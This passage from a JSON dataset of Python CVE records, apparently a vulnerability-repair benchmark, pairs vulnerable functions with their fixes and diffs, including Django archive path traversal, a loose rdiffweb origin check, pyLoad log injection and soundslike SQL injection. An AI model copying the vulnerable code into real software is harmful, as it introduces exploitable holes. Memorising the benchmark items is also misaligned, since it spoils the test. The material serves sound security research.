        "snippet": "def setup_handlers(web_app, serverproxy_config):\n    host_allowlist = serverproxy_config.host_allowlist\n    rewrite_response = serverproxy_config.non_service_rewrite_response\n    web_app.add_handlers('.*', [\n        (\n            url_path_join(\n                web_app.settings['base_url'],\n                r'/proxy/([^/]*):(\\d+)(.*)',\n            ),\n            RemoteProxyHandler,\n            {\n                'absolute_url': False,\n                'host_allowlist': host_allowlist,\n                'rewrite_response': rewrite_response,\n            }\n        ),\n        (\n            url_path_join(\n                web_app.settings['base_url'],\n                r'/proxy/absolute/([^/]*):(\\d+)(.*)',\n            ),\n            RemoteProxyHandler,\n            {\n                'absolute_url': True,\n                'host_allowlist': host_allowlist,\n                'rewrite_response': rewrite_response,\n            }\n        ),\n        (\n            url_path_join(\n                web_app.settings['base_url'],\n                r'/proxy/(\\d+)(.*)',\n            ),\n            LocalProxyHandler,\n            {\n                'absolute_url': False,\n                'rewrite_response': rewrite_response,\n            },\n        ),\n        (\n            url_path_join(\n                web_app.settings['base_url'],\n                r'/proxy/absolute/(\\d+)(.*)',\n            ),\n            LocalProxyHandler,\n            {\n                'absolute_url': True,\n                'rewrite_response': rewrite_response,\n            },\n        ),\n    ])"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_186_1",
        "commit": "fd31930",
        "file_path": "jupyter_server_proxy/handlers.py",
        "start_line": 211,
        "end_line": 240,
        "snippet": "    def get_client_uri(self, protocol, host, port, proxied_path):\n        if self.absolute_url:\n            context_path = self._get_context_path(host, port)\n            client_path = url_path_join(context_path, proxied_path)\n        else:\n            client_path = proxied_path\n\n        # ensure client_path always starts with '/'\n        if not client_path.startswith(\"/\"):\n            client_path = \"/\" + client_path\n\n        # Quote spaces, \\u00e5\\u00e4\\u00f6 and such, but only enough to send a valid web\n        # request onwards. To do this, we mark the RFC 3986 specs' \"reserved\"\n        # and \"un-reserved\" characters as safe that won't need quoting. The\n        # un-reserved need to be marked safe to ensure the quote function behave\n        # the same in py36 as py37.\n        #\n        # ref: https://tools.ietf.org/html/rfc3986#section-2.2\n        client_path = quote(client_path, safe=\":/?#[]@!$&'()*+,;=-._~\")\n\n        client_uri = '{protocol}://{host}:{port}{path}'.format(\n            protocol=protocol,\n            host=host,\n            port=port,\n            path=client_path,\n        )\n        if self.request.query:\n            client_uri += '?' + self.request.query\n\n        return client_uri"
      },
      {
        "id": "fix_py_186_2",
        "commit": "fd31930",
        "file_path": "jupyter_server_proxy/handlers.py",
        "start_line": 693,
        "end_line": 746,
        "snippet": "def setup_handlers(web_app, serverproxy_config):\n    host_allowlist = serverproxy_config.host_allowlist\n    rewrite_response = serverproxy_config.non_service_rewrite_response\n    web_app.add_handlers(\n        \".*\",\n        [\n            (\n                url_path_join(\n                    web_app.settings[\"base_url\"],\n                    r\"/proxy/([^/:@]+):(\\d+)(/.*|)\",\n                ),\n                RemoteProxyHandler,\n                {\n                    \"absolute_url\": False,\n                    \"host_allowlist\": host_allowlist,\n                    \"rewrite_response\": rewrite_response,\n                },\n            ),\n            (\n                url_path_join(\n                    web_app.settings[\"base_url\"],\n                    r\"/proxy/absolute/([^/:@]+):(\\d+)(/.*|)\",\n                ),\n                RemoteProxyHandler,\n                {\n                    \"absolute_url\": True,\n                    \"host_allowlist\": host_allowlist,\n                    \"rewrite_response\": rewrite_response,\n                },\n            ),\n            (\n                url_path_join(\n                    web_app.settings[\"base_url\"],\n                    r\"/proxy/(\\d+)(/.*|)\",\n                ),\n                LocalProxyHandler,\n                {\n                    \"absolute_url\": False,\n                    \"rewrite_response\": rewrite_response,\n                },\n            ),\n            (\n                url_path_join(\n                    web_app.settings[\"base_url\"],\n                    r\"/proxy/absolute/(\\d+)(/.*|)\",\n                ),\n                LocalProxyHandler,\n                {\n                    \"absolute_url\": True,\n                    \"rewrite_response\": rewrite_response,\n                },\n            ),\n        ],\n    )"
      }
    ],
    "vul_patch": "--- a/jupyter_server_proxy/handlers.py\n+++ b/jupyter_server_proxy/handlers.py\n@@ -1,9 +1,13 @@\n     def get_client_uri(self, protocol, host, port, proxied_path):\n-        context_path = self._get_context_path(host, port)\n         if self.absolute_url:\n+            context_path = self._get_context_path(host, port)\n             client_path = url_path_join(context_path, proxied_path)\n         else:\n             client_path = proxied_path\n+\n+        # ensure client_path always starts with '/'\n+        if not client_path.startswith(\"/\"):\n+            client_path = \"/\" + client_path\n \n         # Quote spaces, \\u00e5\\u00e4\\u00f6 and such, but only enough to send a valid web\n         # request onwards. To do this, we mark the RFC 3986 specs' \"reserved\"\n@@ -18,7 +22,7 @@\n             protocol=protocol,\n             host=host,\n             port=port,\n-            path=client_path\n+            path=client_path,\n         )\n         if self.request.query:\n             client_uri += '?' + self.request.query\n\n--- a/jupyter_server_proxy/handlers.py\n+++ b/jupyter_server_proxy/handlers.py\n@@ -1,51 +1,54 @@\n def setup_handlers(web_app, serverproxy_config):\n     host_allowlist = serverproxy_config.host_allowlist\n     rewrite_response = serverproxy_config.non_service_rewrite_response\n-    web_app.add_handlers('.*', [\n-        (\n-            url_path_join(\n-                web_app.settings['base_url'],\n-                r'/proxy/([^/]*):(\\d+)(.*)',\n+    web_app.add_handlers(\n+        \".*\",\n+        [\n+            (\n+                url_path_join(\n+                    web_app.settings[\"base_url\"],\n+                    r\"/proxy/([^/:@]+):(\\d+)(/.*|)\",\n+                ),\n+                RemoteProxyHandler,\n+                {\n+                    \"absolute_url\": False,\n+                    \"host_allowlist\": host_allowlist,\n+                    \"rewrite_response\": rewrite_response,\n+                },\n             ),\n-            RemoteProxyHandler,\n-            {\n-                'absolute_url': False,\n-                'host_allowlist': host_allowlist,\n-                'rewrite_response': rewrite_response,\n-            }\n-        ),\n-        (\n-            url_path_join(\n-                web_app.settings['base_url'],\n-                r'/proxy/absolute/([^/]*):(\\d+)(.*)',\n+            (\n+                url_path_join(\n+                    web_app.settings[\"base_url\"],\n+                    r\"/proxy/absolute/([^/:@]+):(\\d+)(/.*|)\",\n+                ),\n+                RemoteProxyHandler,\n+                {\n+                    \"absolute_url\": True,\n+                    \"host_allowlist\": host_allowlist,\n+                    \"rewrite_response\": rewrite_response,\n+                },\n             ),\n-            RemoteProxyHandler,\n-            {\n-                'absolute_url': True,\n-                'host_allowlist': host_allowlist,\n-                'rewrite_response': rewrite_response,\n-            }\n-        ),\n-        (\n-            url_path_join(\n-                web_app.settings['base_url'],\n-                r'/proxy/(\\d+)(.*)',\n+            (\n+                url_path_join(\n+                    web_app.settings[\"base_url\"],\n+                    r\"/proxy/(\\d+)(/.*|)\",\n+                ),\n+                LocalProxyHandler,\n+                {\n+                    \"absolute_url\": False,\n+                    \"rewrite_response\": rewrite_response,\n+                },\n             ),\n-            LocalProxyHandler,\n-            {\n-                'absolute_url': False,\n-                'rewrite_response': rewrite_response,\n-            },\n-        ),\n-        (\n-            url_path_join(\n-                web_app.settings['base_url'],\n-                r'/proxy/absolute/(\\d+)(.*)',\n+            (\n+                url_path_join(\n+                    web_app.settings[\"base_url\"],\n+                    r\"/proxy/absolute/(\\d+)(/.*|)\",\n+                ),\n+                LocalProxyHandler,\n+                {\n+                    \"absolute_url\": True,\n+                    \"rewrite_response\": rewrite_response,\n+                },\n             ),\n-            LocalProxyHandler,\n-            {\n-                'absolute_url': True,\n-                'rewrite_response': rewrite_response,\n-            },\n-        ),\n-    ])\n+        ],\n+    )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-3281",
    "cve_description": "In Django 2.2 before 2.2.18, 3.0 before 3.0.12, and 3.1 before 3.1.6, the django.utils.archive.extract method (used by \"startapp --template\" and \"startproject --template\") allows directory traversal via an archive with absolute paths or relative paths with dot segments.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/52e409ed17287e9aabda847b6afe58be2fa9f86a",
      "https://github.com/django/django/commit/05413afa8c18cdb978fcdf470e09f7a12b234a23",
      "https://github.com/django/django/commit/02e6592835b4559909aa3aaaf67988fef435f624",
      "https://github.com/django/django/commit/21e7622dec1f8612c85c2fc37fe8efbfd3311e37"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_9_1",
        "commit": "03a8678",
        "file_path": "django/utils/archive.py",
        "start_line": 151,
        "end_line": 179,
        "snippet": "    def extract(self, to_path):\n        members = self._archive.getmembers()\n        leading = self.has_leading_dir(x.name for x in members)\n        for member in members:\n            name = member.name\n            if leading:\n                name = self.split_leading_dir(name)[1]\n            filename = os.path.join(to_path, name)\n            if member.isdir():\n                if filename:\n                    os.makedirs(filename, exist_ok=True)\n            else:\n                try:\n                    extracted = self._archive.extractfile(member)\n                except (KeyError, AttributeError) as exc:\n                    # Some corrupt tar files seem to produce this\n                    # (specifically bad symlinks)\n                    print(\"In the tar file %s the member %s is invalid: %s\" %\n                          (name, member.name, exc))\n                else:\n                    dirname = os.path.dirname(filename)\n                    if dirname:\n                        os.makedirs(dirname, exist_ok=True)\n                    with open(filename, 'wb') as outfile:\n                        shutil.copyfileobj(extracted, outfile)\n                        self._copy_permissions(member.mode, filename)\n                finally:\n                    if extracted:\n                        extracted.close()"
      },
      {
        "id": "vul_py_9_2",
        "commit": "03a8678",
        "file_path": "django/utils/archive.py",
        "start_line": 193,
        "end_line": 213,
        "snippet": "    def extract(self, to_path):\n        namelist = self._archive.namelist()\n        leading = self.has_leading_dir(namelist)\n        for name in namelist:\n            data = self._archive.read(name)\n            info = self._archive.getinfo(name)\n            if leading:\n                name = self.split_leading_dir(name)[1]\n            filename = os.path.join(to_path, name)\n            if filename.endswith(('/', '\\\\')):\n                # A directory\n                os.makedirs(filename, exist_ok=True)\n            else:\n                dirname = os.path.dirname(filename)\n                if dirname:\n                    os.makedirs(dirname, exist_ok=True)\n                with open(filename, 'wb') as outfile:\n                    outfile.write(data)\n                # Convert ZipInfo.external_attr to mode\n                mode = info.external_attr >> 16\n                self._copy_permissions(mode, filename)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_9_1",
        "commit": "02e6592",
        "file_path": "django/utils/archive.py",
        "start_line": 160,
        "end_line": 188,
        "snippet": "    def extract(self, to_path):\n        members = self._archive.getmembers()\n        leading = self.has_leading_dir(x.name for x in members)\n        for member in members:\n            name = member.name\n            if leading:\n                name = self.split_leading_dir(name)[1]\n            filename = self.target_filename(to_path, name)\n            if member.isdir():\n                if filename:\n                    os.makedirs(filename, exist_ok=True)\n            else:\n                try:\n                    extracted = self._archive.extractfile(member)\n                except (KeyError, AttributeError) as exc:\n                    # Some corrupt tar files seem to produce this\n                    # (specifically bad symlinks)\n                    print(\"In the tar file %s the member %s is invalid: %s\" %\n                          (name, member.name, exc))\n                else:\n                    dirname = os.path.dirname(filename)\n                    if dirname:\n                        os.makedirs(dirname, exist_ok=True)\n                    with open(filename, 'wb') as outfile:\n                        shutil.copyfileobj(extracted, outfile)\n                        self._copy_permissions(member.mode, filename)\n                finally:\n                    if extracted:\n                        extracted.close()"
      },
      {
        "id": "fix_py_9_2",
        "commit": "02e6592",
        "file_path": "django/utils/archive.py",
        "start_line": 202,
        "end_line": 224,
        "snippet": "    def extract(self, to_path):\n        namelist = self._archive.namelist()\n        leading = self.has_leading_dir(namelist)\n        for name in namelist:\n            data = self._archive.read(name)\n            info = self._archive.getinfo(name)\n            if leading:\n                name = self.split_leading_dir(name)[1]\n            if not name:\n                continue\n            filename = self.target_filename(to_path, name)\n            if name.endswith(('/', '\\\\')):\n                # A directory\n                os.makedirs(filename, exist_ok=True)\n            else:\n                dirname = os.path.dirname(filename)\n                if dirname:\n                    os.makedirs(dirname, exist_ok=True)\n                with open(filename, 'wb') as outfile:\n                    outfile.write(data)\n                # Convert ZipInfo.external_attr to mode\n                mode = info.external_attr >> 16\n                self._copy_permissions(mode, filename)"
      },
      {
        "id": "fix_py_9_3",
        "commit": "02e6592",
        "file_path": "django/utils/archive.py",
        "start_line": 138,
        "end_line": 143,
        "snippet": "    def target_filename(self, to_path, name):\n        target_path = os.path.abspath(to_path)\n        filename = os.path.abspath(os.path.join(target_path, name))\n        if not filename.startswith(target_path):\n            raise SuspiciousOperation(\"Archive contains invalid path: '%s'\" % name)\n        return filename"
      }
    ],
    "vul_patch": "--- a/django/utils/archive.py\n+++ b/django/utils/archive.py\n@@ -5,7 +5,7 @@\n             name = member.name\n             if leading:\n                 name = self.split_leading_dir(name)[1]\n-            filename = os.path.join(to_path, name)\n+            filename = self.target_filename(to_path, name)\n             if member.isdir():\n                 if filename:\n                     os.makedirs(filename, exist_ok=True)\n\n--- a/django/utils/archive.py\n+++ b/django/utils/archive.py\n@@ -6,8 +6,10 @@\n             info = self._archive.getinfo(name)\n             if leading:\n                 name = self.split_leading_dir(name)[1]\n-            filename = os.path.join(to_path, name)\n-            if filename.endswith(('/', '\\\\')):\n+            if not name:\n+                continue\n+            filename = self.target_filename(to_path, name)\n+            if name.endswith(('/', '\\\\')):\n                 # A directory\n                 os.makedirs(filename, exist_ok=True)\n             else:\n\n--- /dev/null\n+++ b/django/utils/archive.py\n@@ -0,0 +1,6 @@\n+    def target_filename(self, to_path, name):\n+        target_path = os.path.abspath(to_path)\n+        filename = os.path.abspath(os.path.join(target_path, name))\n+        if not filename.startswith(target_path):\n+            raise SuspiciousOperation(\"Archive contains invalid path: '%s'\" % name)\n+        return filename\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-3281:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-3281/bin/python ./runtests.py utils_tests.test_archive.TestArchiveInvalid.test_extract_function_traversal\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-3281:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-3281/bin/python ./runtests.py utils_tests.test_archive \n"
  },
  {
    "cve_id": "CVE-2022-3457",
    "cve_description": "Origin Validation Error in GitHub repository ikus060/rdiffweb prior to 2.5.0a5.",
    "cwe_info": {
      "CWE-346": {
        "name": "Origin Validation Error",
        "description": "The product does not properly verify that the source of data or communication is valid."
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/afc1bdfab5161c74012ff2590a6ec49cc0d8fde0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_420_1",
        "commit": "8becdaf",
        "file_path": "rdiffweb/tools/secure_headers.py",
        "start_line": 34,
        "end_line": 109,
        "snippet": "def set_headers(\n    xfo='DENY',\n    no_cache=True,\n    referrer='same-origin',\n    nosniff=True,\n    xxp='1; mode=block',\n    csp=\"default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'\",\n):\n    \"\"\"\n    This tool provide CSRF mitigation.\n\n    * Define X-Frame-Options = DENY\n    * Define Cookies SameSite=Lax\n    * Define Cookies Secure when https is detected\n    * Validate `Origin` and `Referer` on POST, PUT, PATCH, DELETE\n    * Define Cache-Control by default\n    * Define Referrer-Policy to 'same-origin'\n\n    Ref.:\n    https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\n    https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html\n    \"\"\"\n    request = cherrypy.request\n    response = cherrypy.serving.response\n\n    # Check if Origin matches our target.\n    if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:\n        origin = request.headers.get('Origin', None)\n        if origin and not origin.startswith(request.base):\n            raise cherrypy.HTTPError(403, 'Unexpected Origin header')\n\n    # Check if https is enabled\n    https = request.base.startswith('https')\n\n    # Define X-Frame-Options to avoid Clickjacking\n    if xfo:\n        response.headers['X-Frame-Options'] = xfo\n\n    # Enforce security on cookies\n    cookie = response.cookie.get('session_id', None)\n    if cookie:\n        # Awaiting bug fix in cherrypy\n        # https://github.com/cherrypy/cherrypy/issues/1767\n        # Force SameSite to Lax\n        cookie['samesite'] = 'Lax'\n        if https:\n            cookie['secure'] = 1\n\n    # Add Cache-Control to avoid storing sensible information in Browser cache.\n    if no_cache:\n        response.headers['Cache-control'] = 'no-cache, no-store, must-revalidate, max-age=0'\n        response.headers['Pragma'] = 'no-cache'\n        response.headers['Expires'] = '0'\n\n    # Add Referrer-Policy\n    if referrer:\n        response.headers['Referrer-Policy'] = referrer\n\n    # Add X-Content-Type-Options to avoid browser to \"sniff\" to content-type\n    if nosniff:\n        response.headers['X-Content-Type-Options'] = 'nosniff'\n\n    # Add X-XSS-Protection to enabled XSS protection\n    if xxp:\n        response.headers['X-XSS-Protection'] = xxp\n\n    # Add Content-Security-Policy\n    if csp:\n        response.headers['Content-Security-Policy'] = csp\n\n    # Add Strict-Transport-Security to force https use.\n    if https:\n        response.headers['Strict-Transport-Security'] = \"max-age=31536000; includeSubDomains\"\n\n\ncherrypy.tools.secure_headers = cherrypy.Tool('before_request_body', set_headers, priority=71)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_420_1",
        "commit": "afc1bdfab5161c74012ff2590a6ec49cc0d8fde0",
        "file_path": "rdiffweb/tools/secure_headers.py",
        "start_line": 34,
        "end_line": 109,
        "snippet": "def set_headers(\n    xfo='DENY',\n    no_cache=True,\n    referrer='same-origin',\n    nosniff=True,\n    xxp='1; mode=block',\n    csp=\"default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'\",\n):\n    \"\"\"\n    This tool provide CSRF mitigation.\n\n    * Define X-Frame-Options = DENY\n    * Define Cookies SameSite=Lax\n    * Define Cookies Secure when https is detected\n    * Validate `Origin` and `Referer` on POST, PUT, PATCH, DELETE\n    * Define Cache-Control by default\n    * Define Referrer-Policy to 'same-origin'\n\n    Ref.:\n    https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\n    https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html\n    \"\"\"\n    request = cherrypy.request\n    response = cherrypy.serving.response\n\n    # Check if Origin matches our target.\n    if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:\n        origin = request.headers.get('Origin', None)\n        if origin and origin != request.base:\n            raise cherrypy.HTTPError(403, 'Unexpected Origin header')\n\n    # Check if https is enabled\n    https = request.base.startswith('https')\n\n    # Define X-Frame-Options to avoid Clickjacking\n    if xfo:\n        response.headers['X-Frame-Options'] = xfo\n\n    # Enforce security on cookies\n    cookie = response.cookie.get('session_id', None)\n    if cookie:\n        # Awaiting bug fix in cherrypy\n        # https://github.com/cherrypy/cherrypy/issues/1767\n        # Force SameSite to Lax\n        cookie['samesite'] = 'Lax'\n        if https:\n            cookie['secure'] = 1\n\n    # Add Cache-Control to avoid storing sensible information in Browser cache.\n    if no_cache:\n        response.headers['Cache-control'] = 'no-cache, no-store, must-revalidate, max-age=0'\n        response.headers['Pragma'] = 'no-cache'\n        response.headers['Expires'] = '0'\n\n    # Add Referrer-Policy\n    if referrer:\n        response.headers['Referrer-Policy'] = referrer\n\n    # Add X-Content-Type-Options to avoid browser to \"sniff\" to content-type\n    if nosniff:\n        response.headers['X-Content-Type-Options'] = 'nosniff'\n\n    # Add X-XSS-Protection to enabled XSS protection\n    if xxp:\n        response.headers['X-XSS-Protection'] = xxp\n\n    # Add Content-Security-Policy\n    if csp:\n        response.headers['Content-Security-Policy'] = csp\n\n    # Add Strict-Transport-Security to force https use.\n    if https:\n        response.headers['Strict-Transport-Security'] = \"max-age=31536000; includeSubDomains\"\n\n\ncherrypy.tools.secure_headers = cherrypy.Tool('before_request_body', set_headers, priority=71)"
      }
    ],
    "vul_patch": "--- a/rdiffweb/tools/secure_headers.py\n+++ b/rdiffweb/tools/secure_headers.py\n@@ -26,7 +26,7 @@\n     # Check if Origin matches our target.\n     if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:\n         origin = request.headers.get('Origin', None)\n-        if origin and not origin.startswith(request.base):\n+        if origin and origin != request.base:\n             raise cherrypy.HTTPError(403, 'Unexpected Origin header')\n \n     # Check if https is enabled\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-21645",
    "cve_description": "pyLoad is the free and open-source Download Manager written in pure Python. A log injection vulnerability was identified in `pyload` allowing any unauthenticated actor to inject arbitrary messages into the logs gathered by `pyload`. Forged or otherwise, corrupted log files can be used to cover an attacker\u2019s tracks or even to implicate another party in the commission of a malicious act. This vulnerability has been patched in version 0.5.0b3.dev77.\n",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pyload/pyload",
    "patch_url": [
      "https://github.com/pyload/pyload/commit/4159a1191ec4fe6d927e57a9c4bb8f54e16c381d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_159_1",
        "commit": "bb22063",
        "file_path": "src/pyload/webui/app/blueprints/api_blueprint.py",
        "start_line": 82,
        "end_line": 97,
        "snippet": "def login():\n    user = flask.request.form[\"username\"]\n    password = flask.request.form[\"password\"]\n\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    user_info = api.check_auth(user, password)\n\n    if not user_info:\n        log.error(f\"Login failed for user '{user}'\")\n        return jsonify(False)\n\n    s = set_session(user_info)\n    log.info(f\"User '{user}' successfully logged in\")\n    flask.flash(\"Logged in successfully\")\n\n    return jsonify(s)"
      },
      {
        "id": "vul_py_159_2",
        "commit": "bb22063",
        "file_path": "src/pyload/webui/app/blueprints/app_blueprint.py",
        "start_line": 47,
        "end_line": 78,
        "snippet": "def login():\n    api = flask.current_app.config[\"PYLOAD_API\"]\n\n    next = get_redirect_url(fallback=flask.url_for(\"app.dashboard\"))\n\n    if flask.request.method == \"POST\":\n        user = flask.request.form[\"username\"]\n        password = flask.request.form[\"password\"]\n        user_info = api.check_auth(user, password)\n\n        if not user_info:\n            log.error(f\"Login failed for user '{user}'\")\n            return render_template(\"login.html\", next=next, errors=True)\n\n        set_session(user_info)\n        log.info(f\"User '{user}' successfully logged in\")\n        flask.flash(\"Logged in successfully\")\n\n    if is_authenticated():\n        return flask.redirect(next)\n\n    if api.get_config_value(\"webui\", \"autologin\"):\n        allusers = api.get_all_userdata()\n        if len(allusers) == 1:  # TODO: check if localhost\n            user_info = list(allusers.values())[0]\n            set_session(user_info)\n            # NOTE: Double-check authentication here because if session[name] is empty,\n            #       next login_required redirects here again and all loop out.\n            if is_authenticated():\n                return flask.redirect(next)\n\n    return render_template(\"login.html\", next=next)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_159_1",
        "commit": "4159a11",
        "file_path": "src/pyload/webui/app/blueprints/api_blueprint.py",
        "start_line": 82,
        "end_line": 98,
        "snippet": "def login():\n    user = flask.request.form[\"username\"]\n    password = flask.request.form[\"password\"]\n\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    user_info = api.check_auth(user, password)\n\n    sanitized_user = user.replace(\"\\n\", \"\\\\n\").replace(\"\\r\", \"\\\\r\")\n    if not user_info:\n        log.error(f\"Login failed for user '{sanitized_user}'\")\n        return jsonify(False)\n\n    s = set_session(user_info)\n    log.info(f\"User '{sanitized_user}' successfully logged in\")\n    flask.flash(\"Logged in successfully\")\n\n    return jsonify(s)"
      },
      {
        "id": "fix_py_159_2",
        "commit": "4159a11",
        "file_path": "src/pyload/webui/app/blueprints/app_blueprint.py",
        "start_line": 47,
        "end_line": 79,
        "snippet": "def login():\n    api = flask.current_app.config[\"PYLOAD_API\"]\n\n    next = get_redirect_url(fallback=flask.url_for(\"app.dashboard\"))\n\n    if flask.request.method == \"POST\":\n        user = flask.request.form[\"username\"]\n        password = flask.request.form[\"password\"]\n        user_info = api.check_auth(user, password)\n\n        sanitized_user = user.replace(\"\\n\", \"\\\\n\").replace(\"\\r\", \"\\\\r\")\n        if not user_info:\n            log.error(f\"Login failed for user '{sanitized_user}'\")\n            return render_template(\"login.html\", next=next, errors=True)\n\n        set_session(user_info)\n        log.info(f\"User '{sanitized_user}' successfully logged in\")\n        flask.flash(\"Logged in successfully\")\n\n    if is_authenticated():\n        return flask.redirect(next)\n\n    if api.get_config_value(\"webui\", \"autologin\"):\n        allusers = api.get_all_userdata()\n        if len(allusers) == 1:  # TODO: check if localhost\n            user_info = list(allusers.values())[0]\n            set_session(user_info)\n            # NOTE: Double-check authentication here because if session[name] is empty,\n            #       next login_required redirects here again and all loop out.\n            if is_authenticated():\n                return flask.redirect(next)\n\n    return render_template(\"login.html\", next=next)"
      }
    ],
    "vul_patch": "--- a/src/pyload/webui/app/blueprints/api_blueprint.py\n+++ b/src/pyload/webui/app/blueprints/api_blueprint.py\n@@ -5,12 +5,13 @@\n     api = flask.current_app.config[\"PYLOAD_API\"]\n     user_info = api.check_auth(user, password)\n \n+    sanitized_user = user.replace(\"\\n\", \"\\\\n\").replace(\"\\r\", \"\\\\r\")\n     if not user_info:\n-        log.error(f\"Login failed for user '{user}'\")\n+        log.error(f\"Login failed for user '{sanitized_user}'\")\n         return jsonify(False)\n \n     s = set_session(user_info)\n-    log.info(f\"User '{user}' successfully logged in\")\n+    log.info(f\"User '{sanitized_user}' successfully logged in\")\n     flask.flash(\"Logged in successfully\")\n \n     return jsonify(s)\n\n--- a/src/pyload/webui/app/blueprints/app_blueprint.py\n+++ b/src/pyload/webui/app/blueprints/app_blueprint.py\n@@ -8,12 +8,13 @@\n         password = flask.request.form[\"password\"]\n         user_info = api.check_auth(user, password)\n \n+        sanitized_user = user.replace(\"\\n\", \"\\\\n\").replace(\"\\r\", \"\\\\r\")\n         if not user_info:\n-            log.error(f\"Login failed for user '{user}'\")\n+            log.error(f\"Login failed for user '{sanitized_user}'\")\n             return render_template(\"login.html\", next=next, errors=True)\n \n         set_session(user_info)\n-        log.info(f\"User '{user}' successfully logged in\")\n+        log.info(f\"User '{sanitized_user}' successfully logged in\")\n         flask.flash(\"Logged in successfully\")\n \n     if is_authenticated():\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-20172",
    "cve_description": "A vulnerability was found in ridhoq soundslike. It has been classified as critical. Affected is the function get_song_relations of the file app/api/songs.py. The manipulation leads to sql injection. The patch is identified as 90bb4fb667d9253d497b619b9adaac83bf0ce0f8. It is recommended to apply a patch to fix this issue. VDB-218490 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/ridhoq/soundslike",
    "patch_url": [
      "https://github.com/ridhoq/soundslike/commit/90bb4fb667d9253d497b619b9adaac83bf0ce0f8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_339_1",
        "commit": "d45460ef045843c711536a4a24973d73d0aa7569",
        "file_path": "app/api/songs.py",
        "start_line": 64,
        "end_line": 69,
        "snippet": "def get_song_relations(id):\n    top = request.args.get('top')\n    song = Song.query.filter_by(id=id).first()\n    if not song:\n        return route_not_found(song)\n    return make_response(jsonify(song.get_related_songs_json(top)), 200)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_339_1",
        "commit": "90bb4fb667d9253d497b619b9adaac83bf0ce0f8",
        "file_path": "app/api/songs.py",
        "start_line": 64,
        "end_line": 73,
        "snippet": "def get_song_relations(id):\n    top_str = request.args.get('top')\n    if not top_str.isdigit() or not int(top_str) > 0:\n        message = 'top query param must be an int greater than 0'\n        return bad_request(message)\n    top = int(request.args.get('top'))\n    song = Song.query.filter_by(id=id).first()\n    if not song:\n        return route_not_found(song)\n    return make_response(jsonify(song.get_related_songs_json(top)), 200)"
      }
    ],
    "vul_patch": "--- a/app/api/songs.py\n+++ b/app/api/songs.py\n@@ -1,5 +1,9 @@\n def get_song_relations(id):\n-    top = request.args.get('top')\n+    top_str = request.args.get('top')\n+    if not top_str.isdigit() or not int(top_str) > 0:\n+        message = 'top query param must be an int greater than 0'\n+        return bad_request(message)\n+    top = int(request.args.get('top'))\n     song = Song.query.filter_by(id=id).first()\n     if not song:\n         return route_not_found(song)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0577",
    "cve_description": "Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository scrapy/scrapy prior to 2.6.1.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/scrapy/scrapy",
    "patch_url": [
      "https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a"
    ],
